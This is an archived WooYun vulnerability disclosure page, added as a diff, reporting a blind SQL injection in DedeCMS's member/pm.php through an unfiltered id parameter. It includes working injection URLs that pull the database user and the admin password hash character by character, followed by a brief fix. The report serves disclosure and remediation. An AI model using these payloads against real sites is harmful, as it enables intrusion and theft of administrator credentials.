@@ -1,0 +1,254 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Dedecms 另外一个SQL盲注  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Dedecms 另外一个SQL盲注  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/胸大无脑">胸大无脑</a> 
+</li><li>提交时间：		2013-11-22 14:48</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-22：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-27：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2014-02-17：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">盲注，可获取任意数据，没有上个基于时间的蛋疼，还是有局限性</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">问题出在ROOT_PATH/member/pm.php的64行<br />
+<br />
+</p><p class="detail"><a href="../images/221241283d557a6482aeb406086ef3995356a4aa.png" target="_blank"><img src="../images/221241283d557a6482aeb406086ef3995356a4aa.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+如图$id变量可控<br />
+<br />
+我们向前看，发现$id没有做任何处理<br />
+<br />
+那么id变量来自哪里呢<br />
+<br />
+<br />
+<br />
+第一行require config.php //对应ROOT_PATH/member/config.php<br />
+<br />
+</p><p class="detail"><a href="../images/22124427c695a8ee98725b8de6ee2793fe5990f6.png" target="_blank"><img src="../images/22124427c695a8ee98725b8de6ee2793fe5990f6.png" alt="requireconfig.php.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+然后跟<br />
+<br />
+</p><p class="detail"><a href="../images/22125022e8820475b79a168a774924ffe8eae09d.png" target="_blank"><img src="../images/22125022e8820475b79a168a774924ffe8eae09d.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+然后再进去在<br />
+<br />
+ROOT_PATH/include/filter.inc.php<br />
+<br />
+</p><p class="detail"><a href="../images/22125115708097b54b14a4b45f9310a45b199cd7.png" target="_blank"><img src="../images/22125115708097b54b14a4b45f9310a45b199cd7.png" alt="filter.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+里面有获取参数的代码。<br />
+<br />
+<br />
+<br />
+一路走下来发现$id变量没有做任何处理<br />
+<br />
+</p><p class="detail"><a href="../images/221258015b34a4a799e3dc6d9d1aa910b787cc7d.png" target="_blank"><img src="../images/221258015b34a4a799e3dc6d9d1aa910b787cc7d.png" alt=".png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">首先给自己留个言<br />
+<br />
+访问留言对应的id的url可以看到这条留言<br />
+<br />
+http://127.0.0.1/dede/member/pm.php?dopost=read&amp;id=1<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/221235227b7a290dc9253c523ac8e78079e560ee.png" target="_blank"><img src="../images/221235227b7a290dc9253c523ac8e78079e560ee.png" alt=".png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+然后注入，获取数据库用户<br />
+<br />
+正确<br />
+<br />
+</p><pre><code>http://127.0.0.1/dede/member/pm.php?dopost=read&amp;id=1&#039; and 1=@`&#039;` or 2=(select if(substring((select user()),1,1) =&#039;r&#039;,2,1)) -- -@`&#039;`</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/2212520377fe5def53a3678a1583ea2ce04389c9.png" target="_blank"><img src="../images/2212520377fe5def53a3678a1583ea2ce04389c9.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+错误<br />
+<br />
+</p><pre><code>http://127.0.0.1/dede/member/pm.php?dopost=read&amp;id=1&#039; and 1=@`&#039;` or 2=(select if(substring((select user()),1,1) =&#039;X&#039;,2,1)) -- -@`&#039;`</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/221253158ac6938a282c5e97ad2ffd1a04db9114.png" target="_blank"><img src="../images/221253158ac6938a282c5e97ad2ffd1a04db9114.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+获取admin密码<br />
+<br />
+<br />
+<br />
+正确<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://127.0.0.1/dede/member/pm.php?dopost=read&amp;id=1&#039; and 1=@`&#039;` or 2=(select if(substring((SELECT pwd from dede_admin),1,1) =&#039;f&#039;,2,1)) -- -@`&#039;`</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/221255317d396fceb73d1710c204445dfac3040b.png" target="_blank"><img src="../images/221255317d396fceb73d1710c204445dfac3040b.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+错误<br />
+<br />
+</p><pre><code>http://127.0.0.1/dede/member/pm.php?dopost=read&amp;id=1&#039; and 1=@`&#039;` or 2=(select if(substring((SELECT pwd from dede_admin),1,1) =&#039;X&#039;,2,1)) -- -@`&#039;`</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/221255470a4e15af4992ab1f0f2cc725da88f354.png" target="_blank"><img src="../images/221255470a4e15af4992ab1f0f2cc725da88f354.png" alt="2.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">限制id为整数 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/胸大无脑" title="胸大无脑">胸大无脑</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-043704" title="Dedecms 另外一个SQL盲注">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-11-27 14:49</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="43704";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
